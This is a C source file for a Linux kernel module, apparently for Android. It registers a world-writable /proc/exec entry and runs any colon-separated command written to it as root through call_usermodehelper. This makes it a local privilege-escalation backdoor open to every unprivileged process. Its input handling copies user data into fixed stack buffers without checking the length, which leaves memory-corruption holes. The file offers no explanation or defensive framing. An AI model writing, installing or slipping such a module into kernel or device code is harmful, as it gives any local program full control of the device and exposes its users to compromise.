#include <linux/proc_fs.h>
#include <linux/syscalls.h>
#include <linux/kmod.h>
#include <asm/uaccess.h>

static int exec_write_proc(struct file *file, const char __user *buffer, unsigned long count, void *data)
{
	char buf[128];
	char tmp[3][64];
	char* argv[4];
	char* envp[] = {"HOME=/", "PATH=/sbin:/bin:/system/bin", NULL};
	char tmp_one;
	int i,j=0,k=0;

	memset(buf, 0, sizeof(buf));
	memset(tmp, 0, sizeof(tmp));
	if (copy_from_user(buf, buffer, count))
		return -EFAULT;		
	for (i = 0; i < count; i++) {
		strncpy(&tmp_one, &buf[i], 1);
		if (!strncmp(&tmp_one, ":", 1)) {
			if (j == 0)
				strncpy(&tmp[j][0], buf, i);
			else
				strncpy(&tmp[j][0], &buf[i+1], (i - k));
			k = i;
			j++;
		} else if (i == (count - 1)) {
			if (j == 0)
				strncpy(tmp[j], buf, i);
			else
				strncpy(&tmp[j][0], &buf[k+1], (i - k));
		} 
	}
	argv[0] = &tmp[0][0];
	argv[3] = NULL;

	if (j == 0) {
		argv[1] = NULL;
		argv[2] = NULL;
	} else if (j == 1) {
		argv[1] = &tmp[1][0];
		argv[2] = NULL;
	} else if (j == 2) {
		argv[1] = &tmp[1][0];
		argv[2] = &tmp[2][0];
	}

	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	return count;
}

static int __init init_proc_exec(void)
{
	struct proc_dir_entry *res;

	res = create_proc_entry("exec", 0666, NULL);
	if (res) {
		res->read_proc = NULL;
		res->write_proc = exec_write_proc;
		res->data = NULL;
	}
	return 0;
}

module_init(init_proc_exec);

